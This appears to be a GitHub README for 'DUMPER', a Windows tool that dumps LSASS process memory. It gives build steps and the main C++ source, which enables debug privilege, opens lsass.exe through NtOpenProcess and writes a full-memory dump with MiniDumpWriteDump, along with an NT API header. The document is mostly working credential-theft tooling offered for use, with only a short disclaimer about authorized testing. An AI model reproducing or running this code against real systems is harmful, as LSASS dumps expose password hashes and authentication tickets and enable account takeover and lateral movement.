# DUMPER
Dumper is a tool designed to create a memory dump of the LSASS (Local Security Authority Subsystem Service) process on a Windows machine. This tool utilizes NT API functions and the MiniDumpWriteDump function to capture the process memory.

## Features
Check if the tool is running with elevated privileges.
Enable debug privileges to access sensitive process information.
Capture a memory dump of the LSASS process using MiniDumpWriteDump.

## Requirements
Windows OS
Visual Studio (or any compatible C++ compiler)
Administrative privileges to run the tool

## Setup
Clone the Repository

```bash
git clone https://github.com/Raulisr00t/DUMPER.git
cd DUMPER
```
Open Project in Visual Studio
Open DUMPER.sln.sln in Visual Studio.
Compile the Project
Build the solution by clicking on Build -> Build Solution.

### Usage
Run as Administrator
Make sure to run the compiled executable with administrative privileges.

Command Line Arguments
Currently, the tool does not accept any command line arguments. Simply running the executable will perform the memory dump.

### Output

The memory dump will be saved in the same directory as Raulisr00t.file.

### Code Overview
#### Main code
```cpp
int main(int argc, char* argv[]) {
    // Load NT API functions
    if (!LoadNtApi()) {
        cerr << "\t\t[!] Failed to load NT API functions" << endl;
        return 1;
    }

    // Check for elevated privileges
    if (!isElevated()) {
        cerr << "\t\t[!] Please run this tool with admin privileges" << endl;
        return 1;
    }

    // Enable debug privileges
    if (!EnableDebugPrivilege()) {
        cerr << "\t\t[!] Failed to enable debug privileges" << endl;
        return 1;
    }

    // Get the process ID of LSASS
    DWORD pid = GetPID(L"lsass.exe");
    if (pid == 0) {
        cerr << "\t\t[!] Invalid Process. Try Again." << endl;
        return 1;
    }

    // Open the LSASS process
    HANDLE hLsass = NULL;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING processName;
    CLIENT_ID clientId;

    RtlInitUnicodeString(&processName, L"lsass.exe");
    InitializeObjectAttributes(&objAttr, &processName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    clientId.UniqueProcess = ULongToHandle(pid);
    clientId.UniqueThread = NULL;

    NTSTATUS status = NtOpenProcess(&hLsass, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &objAttr, &clientId);
    if (status != STATUS_SUCCESS) {
        cerr << "\t\t[!] Failed to open Process with Native API" << endl;
        return 1;
    }

    // Create the dump file
    TCHAR szFileName[MAX_PATH];
    _stprintf_s(szFileName, MAX_PATH, _T("Raulisr00t.file"));

    HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        cerr << "\t\t[!] Unable to create file" << endl;
        NtClose(hLsass);
        return 1;
    }

    // Write the dump
    MINIDUMP_EXCEPTION_INFORMATION dumpExInfo;
    dumpExInfo.ThreadId = GetCurrentThreadId();
    dumpExInfo.ExceptionPointers = NULL;
    dumpExInfo.ClientPointers = FALSE;

    BOOL result = MiniDumpWriteDump(hLsass, pid, hFile, MiniDumpWithFullMemory, &dumpExInfo, NULL, NULL);
    if (!result) {
        cerr << "\t\t[!] Failed to Dump Process Memory" << endl;
    } else {
        cout << "\t\t[!] Process memory dumped successfully" << endl;
    }

    // Cleanup
    NtClose(hLsass);
    CloseHandle(hFile);

    return 0;
}
```
#### NtApi header
```cpp
#pragma once

#include <Windows.h>

#define STATUS_SUCCESS 0
#define OBJ_CASE_INSENSITIVE 0x00000040L

#define FILE_OVERWRITE_IF 0x00000005
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
typedef LONG KPRIORITY;

#define InitializeObjectAttributes( i, o, a, r, s ) {    \
      (i)->Length = sizeof( OBJECT_ATTRIBUTES );         \
      (i)->RootDirectory = r;                            \
      (i)->Attributes = a;                               \
      (i)->ObjectName = o;                               \
      (i)->SecurityDescriptor = s;                       \
      (i)->SecurityQualityOfService = NULL;              \
   }

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef const UNICODE_STRING* PCUNICODE_STRING;

typedef struct _WIN_VER_INFO {
    WCHAR chOSMajorMinor[8];
    DWORD dwBuildNumber;
    UNICODE_STRING ProcName;
    HANDLE hTargetPID;
    LPCSTR lpApiCall;
    INT SystemCall;
} WIN_VER_INFO, * PWIN_VER_INFO;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation,
    SystemProcessorInformation,
    SystemPerformanceInformation,
    SystemTimeOfDayInformation,
    SystemPathInformation,
    SystemProcessInformation,
    SystemCallCountInformation,
    SystemDeviceInformation,
    SystemProcessorPerformanceInformation,
    SystemFlagsInformation,
    SystemCallTimeInformation,
    SystemModuleInformation
} SYSTEM_INFORMATION_CLASS, * PSYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_PROCESSES {
    ULONG NextEntryDelta;
    ULONG ThreadCount;
    ULONG Reserved1[6];
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ProcessName;
    KPRIORITY BasePriority;
    HANDLE ProcessId;
    HANDLE InheritedFromProcessId;
} SYSTEM_PROCESSES, * PSYSTEM_PROCESSES;

typedef struct _IO_STATUS_BLOCK {
    union {
        LONG Status;
        PVOID Pointer;
    };
    ULONG Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

inline void RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString) {
    if (SourceString) {
        size_t length = wcslen(SourceString) * sizeof(WCHAR);
        DestinationString->Length = static_cast<USHORT>(length);
        DestinationString->MaximumLength = static_cast<USHORT>(length + sizeof(WCHAR));
        DestinationString->Buffer = const_cast<PWSTR>(SourceString);
    } else {
        DestinationString->Length = 0;
        DestinationString->MaximumLength = 0;
        DestinationString->Buffer = nullptr;
    }
}

typedef NTSTATUS(NTAPI* _NtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
typedef NTSTATUS(NTAPI* _NtClose)(HANDLE);
extern _NtOpenProcess NtOpenProcess;
extern _NtClose NtClose;
```
## License
This project is licensed under the MIT License. See the LICENSE file for more details.

## Disclaimer
This tool is intended for educational and authorized testing purposes only. Unauthorized use of this tool is strictly prohibited. The author is not responsible for any misuse or damage caused by this tool.
